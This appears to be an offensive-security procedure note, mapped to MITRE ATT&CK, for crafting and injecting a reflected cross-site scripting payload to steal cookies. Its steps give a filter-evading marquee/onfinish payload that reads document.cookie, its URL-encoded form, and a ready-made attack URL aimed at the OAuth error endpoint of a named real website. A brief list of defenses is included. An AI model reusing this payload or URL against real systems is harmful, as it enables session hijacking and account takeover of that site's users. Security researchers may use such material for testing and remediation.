---
tags:
  - xss
  - payload-crafting
  - injection
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands: []
platforms:
  - Web
techniques:
  - '[[JavaScript]]'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
id: c646ef33-f380-4d84-8945-ab9f429e801b
created_at: '2025-12-13T09:01:26.571Z'
updated_at: '2025-12-13T09:01:26.571Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Craft and Inject XSS Payload into Query Parameters

## Summary

This procedure focuses on creating a custom XSS payload designed to exploit reflected parameters and injecting it into a URL for later execution, targeting cookie theft.

## Description

The payload uses a marquee tag with an onfinish event to execute JavaScript that displays document.cookie in a confirm dialog. It is URL-encoded and injected into the error_hint parameter of the vulnerable endpoint. This works in web environments where parameters are reflected unsanitized, leading to arbitrary code execution when the URL is visited.

## Requirements

1. Knowledge of JavaScript and HTML injection techniques
2. Tool for URL encoding (e.g., browser developer tools or online encoders)
3. Identified vulnerable parameters from prior discovery

## Defense

Defensive measures and detection strategies:

- Sanitize all user-controlled inputs before reflection
- Validate and encode query parameters on the server-side
- Implement web application firewall (WAF) rules to detect XSS patterns

## Objectives

1. Develop a functional XSS payload
2. Properly encode and inject it into the URL
3. Ensure the payload triggers JavaScript execution

## Instructions

### Step 1: Design the XSS Payload

**Context**: Create a payload that evades basic filters and executes JS.

Craft the payload: <marquee loop=1 width=0 onfinish=co\u006efirm(document.cookie)>XSS</marquee>

> This uses a marquee tag to loop once and trigger confirm(document.cookie) on finish.

### Step 2: URL-Encode and Inject Payload

**Context**: Encode the payload and append to the vulnerable parameter.

URL-encode the payload as: %3Cmarquee%20loop%3d1%20width%3d0%20onfinish%3dco%5Cu006efirm(document.cookie)%3EXSS%3C%2fmarquee%3E

Construct the full URL: https://auth2.zomato.com/oauth2/fallbacks/error?error=xss&error_description=xsssy&error_hint=%3Cmarquee%20loop%3d1%20width%3d0%20onfinish%3dco%5Cu006efirm(document.cookie)%3EXSS%3C%2fmarquee%3E

> Use placeholder values for other parameters to mimic legitimate errors.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]

### Sub-Techniques



## Commands Used



## Tools Used



## Tags

- [[xss]]
- [[payload-crafting]]
